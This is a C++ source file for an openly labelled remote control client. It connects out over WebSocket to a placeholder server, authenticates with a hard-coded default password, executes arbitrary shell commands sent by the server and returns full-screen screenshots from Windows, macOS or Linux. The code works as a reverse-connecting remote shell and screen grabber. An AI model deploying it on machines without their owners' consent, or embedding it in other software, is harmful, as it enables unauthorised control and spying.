#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstring>
#include <sstream>
#include <vector>
#include <fstream>
#include <algorithm>
#include <ixwebsocket/IXWebSocket.h>
#include <ixwebsocket/IXNetSystem.h>

// Windows 截图
#ifdef _WIN32
    #define NOMINMAX
    #include <windows.h>
    #include <gdiplus.h>
    #pragma comment(lib, "gdiplus.lib")
#endif

// 配置
#ifndef SERVER_URL
    #define SERVER_URL "ws://your-server-ip:3000"
#endif
#ifndef AUTH_PASSWORD
    #define AUTH_PASSWORD "meow123456"
#endif

// ==================== 简易 JSON 构造 ====================
static std::string jsonStr(const std::string& key, const std::string& val) {
    return "{\"" + key + "\":\"" + val + "\"}";
}

static std::string jsonBuild(const std::vector<std::pair<std::string, std::string>>& pairs) {
    std::string s = "{";
    for (size_t i = 0; i < pairs.size(); i++) {
        if (i > 0) s += ",";
        s += "\"" + pairs[i].first + "\":\"" + pairs[i].second + "\"";
    }
    s += "}";
    return s;
}

static std::string jsonBuildNum(const std::vector<std::pair<std::string, std::string>>& pairs, const std::string& numKey, int numVal) {
    std::string s = "{";
    for (size_t i = 0; i < pairs.size(); i++) {
        if (i > 0) s += ",";
        s += "\"" + pairs[i].first + "\":\"" + pairs[i].second + "\"";
    }
    s += ",\"" + numKey + "\":" + std::to_string(numVal) + "}";
    return s;
}

static std::string jsonEscape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default: out += c;
        }
    }
    return out;
}

// 简易 JSON 取值
static std::string jsonGetStr(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    std::string val;
    while (pos < json.size() && json[pos] != '\"') {
        if (json[pos] == '\\' && pos + 1 < json.size()) {
            pos++;
            if (json[pos] == 'n') val += '\n';
            else if (json[pos] == 'r') val += '\r';
            else if (json[pos] == 't') val += '\t';
            else val += json[pos];
        } else {
            val += json[pos];
        }
        pos++;
    }
    return val;
}

// ==================== Shell 执行 ====================
static std::string execShell(const std::string& cmd) {
    std::string result;
#ifdef _WIN32
    std::string fullCmd = "chcp 65001 > nul 2>nul & " + cmd;
    FILE* pipe = _popen(fullCmd.c_str(), "r");
#else
    FILE* pipe = popen((cmd + " 2>&1").c_str(), "r");
#endif
    if (!pipe) return "无法执行命令";
    char buf[4096];
    while (fgets(buf, sizeof(buf), pipe) != nullptr) {
        result += buf;
    }
    int rc = pclose(pipe);
    result += "\n[退出码: " + std::to_string(rc) + "]";
    return result;
}

// ==================== 截图 ====================
#ifdef _WIN32
static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, pCodecInfo);
    for (UINT j = 0; j < num; j++) {
        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pCodecInfo[j].Clsid;
            free(pCodecInfo);
            return j;
        }
    }
    free(pCodecInfo);
    return -1;
}

static std::string base64Encode(const std::vector<unsigned char>& data) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    for (size_t i = 0; i < data.size(); i += 3) {
        int b0 = data[i];
        int b1 = (i + 1 < data.size()) ? data[i + 1] : 0;
        int b2 = (i + 2 < data.size()) ? data[i + 2] : 0;
        out += b64[(b0 >> 2) & 0x3F];
        out += b64[((b0 << 4) | (b1 >> 4)) & 0x3F];
        out += (i + 1 < data.size()) ? b64[((b1 << 2) | (b2 >> 6)) & 0x3F] : '=';
        out += (i + 2 < data.size()) ? b64[b2 & 0x3F] : '=';
    }
    return out;
}
#endif

static bool captureScreenshot(std::string& outBase64) {
#ifdef _WIN32
    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR token;
    Gdiplus::GdiplusStartup(&token, &gsi, nullptr);

    int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int screenW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screenH = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, screenX, screenY, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);

    IStream* pStream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &pStream);
    bitmap.Save(pStream, &clsid, nullptr);

    STATSTG stat;
    pStream->Stat(&stat, STATFLAG_NONAME);
    ULONG size = stat.cbSize.LowPart;
    std::vector<unsigned char> buf(size);
    LARGE_INTEGER zero = {};
    pStream->Seek(zero, STREAM_SEEK_SET, nullptr);
    pStream->Read(buf.data(), size, nullptr);
    outBase64 = base64Encode(buf);

    pStream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    Gdiplus::GdiplusShutdown(token);
    return true;

#elif defined(__APPLE__)
    std::string tmpFile = "/tmp/rc_shot_" + std::to_string(time(nullptr)) + ".png";
    std::string cmd = "screencapture -x -t png \"" + tmpFile + "\" 2>/dev/null";
    if (system(cmd.c_str()) != 0) return false;

    std::ifstream f(tmpFile, std::ios::binary);
    if (!f) return false;
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)),
                                     std::istreambuf_iterator<char>());
    f.close();
    remove(tmpFile.c_str());

    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    outBase64.clear();
    for (size_t j = 0; j < data.size(); j += 3) {
        int b0 = data[j];
        int b1 = (j + 1 < data.size()) ? data[j + 1] : 0;
        int b2 = (j + 2 < data.size()) ? data[j + 2] : 0;
        outBase64 += b64[(b0 >> 2) & 0x3F];
        outBase64 += b64[((b0 << 4) | (b1 >> 4)) & 0x3F];
        outBase64 += (j + 1 < data.size()) ? b64[((b1 << 2) | (b2 >> 6)) & 0x3F] : '=';
        outBase64 += (j + 2 < data.size()) ? b64[b2 & 0x3F] : '=';
    }
    return true;

#else
    std::string tmpFile = "/tmp/rc_shot_" + std::to_string(time(nullptr)) + ".png";
    std::vector<std::string> cmds = {
        "import -window root \"" + tmpFile + "\" 2>/dev/null",
        "gnome-screenshot -f \"" + tmpFile + "\" 2>/dev/null",
        "scrot \"" + tmpFile + "\" 2>/dev/null",
        "spectacle -b -o \"" + tmpFile + "\" 2>/dev/null",
        "xfce4-screenshooter -f -s \"" + tmpFile + "\" 2>/dev/null"
    };
    bool ok = false;
    for (const auto& c : cmds) {
        if (system(c.c_str()) == 0) { ok = true; break; }
    }
    if (!ok) return false;

    std::this_thread::sleep_for(std::chrono::milliseconds(200));

    std::ifstream f(tmpFile, std::ios::binary);
    if (!f) return false;
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)),
                                     std::istreambuf_iterator<char>());
    f.close();
    remove(tmpFile.c_str());
    if (data.empty()) return false;

    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    outBase64.clear();
    for (size_t j = 0; j < data.size(); j += 3) {
        int b0 = data[j];
        int b1 = (j + 1 < data.size()) ? data[j + 1] : 0;
        int b2 = (j + 2 < data.size()) ? data[j + 2] : 0;
        outBase64 += b64[(b0 >> 2) & 0x3F];
        outBase64 += b64[((b0 << 4) | (b1 >> 4)) & 0x3F];
        outBase64 += (j + 1 < data.size()) ? b64[((b1 << 2) | (b2 >> 6)) & 0x3F] : '=';
        outBase64 += (j + 2 < data.size()) ? b64[b2 & 0x3F] : '=';
    }
    return true;
#endif
}

// ==================== 主函数 ====================
int main(int argc, char* argv[]) {
    std::string serverUrl = SERVER_URL;
    std::string password = AUTH_PASSWORD;

    if (argc >= 2) serverUrl = argv[1];
    if (argc >= 3) password = argv[2];

    std::cout << "[启动] 远程控制客户端 v1.0" << std::endl;
    std::cout << "[配置] 服务器: " << serverUrl << std::endl;
    std::cout << "[配置] 按 Ctrl+C 退出" << std::endl;

    ix::initNetSystem();

    while (true) {
        ix::WebSocket ws;
        ws.setUrl(serverUrl);
        ws.setHeartBeatPeriod(10);

        bool connected = false;
        bool authed = false;

        ws.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
            if (msg->type == ix::WebSocketMessageType::Open) {
                std::cout << "[连接] 已连接到服务器" << std::endl;
                connected = true;
                std::string auth = jsonBuild({
                    {"type", "auth"},
                    {"role", "client"},
                    {"password", password}
                });
                ws.send(auth);
                return;
            }

            if (msg->type == ix::WebSocketMessageType::Close) {
                std::cout << "[断开] " << msg->closeInfo.reason << std::endl;
                connected = false;
                authed = false;
                return;
            }

            if (msg->type == ix::WebSocketMessageType::Error) {
                std::cout << "[错误] " << msg->errorInfo.reason << std::endl;
                connected = false;
                authed = false;
                return;
            }

            if (msg->type == ix::WebSocketMessageType::Message) {
                std::string payload = msg->str;
                std::string type = jsonGetStr(payload, "type");

                if (type == "auth_result") {
                    std::string ok = jsonGetStr(payload, "ok");
                    if (ok == "true") {
                        std::cout << "[认证] 成功，等待命令..." << std::endl;
                        authed = true;
                    } else {
                        std::cout << "[认证] 失败: " << jsonGetStr(payload, "message") << std::endl;
                        ws.stop();
                    }
                    return;
                }

                if (!authed) return;

                if (type == "ping") {
                    ws.send(jsonStr("type", "pong"));
                    return;
                }

                if (type == "shell_exec") {
                    std::string cmd = jsonGetStr(payload, "command");
                    std::string reqId = jsonGetStr(payload, "reqId");
                    std::cout << "[命令] shell: " << cmd << std::endl;
                    std::string output = execShell(cmd);
                    std::string resp = jsonBuild({
                        {"type", "shell_result"},
                        {"reqId", reqId},
                        {"stdout", jsonEscape(output)},
                        {"stderr", ""}
                    });
                    ws.send(resp);
                    std::cout << "[完成] shell 返回 " << output.size() << " 字节" << std::endl;
                    return;
                }

                if (type == "screenshot") {
                    std::string reqId = jsonGetStr(payload, "reqId");
                    std::cout << "[命令] 截图..." << std::endl;
                    std::string base64;
                    bool ok = captureScreenshot(base64);

                    if (ok) {
                        std::string resp = jsonBuildNum({
                            {"type", "screenshot_result"},
                            {"reqId", reqId},
                            {"base64", base64}
                        }, "size", (int)(base64.size() * 3 / 4));
                        ws.send(resp);
                        std::cout << "[完成] 截图 " << (base64.size() * 3 / 4) << " 字节" << std::endl;
                    } else {
                        std::string resp = jsonBuild({
                            {"type", "error"},
                            {"reqId", reqId},
                            {"message", "截图失败，请安装截图工具 (Linux 需安装 ImageMagick 或 scrot)"}
                        });
                        ws.send(resp);
                        std::cout << "[失败] 截图失败" << std::endl;
                    }
                    return;
                }
            }
        });

        ws.start();
        std::cout << "[连接] 正在连接..." << std::endl;

        while (connected) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }

        std::cout << "[重连] 5 秒后重试..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    ix::uninitNetSystem();
    return 0;
}
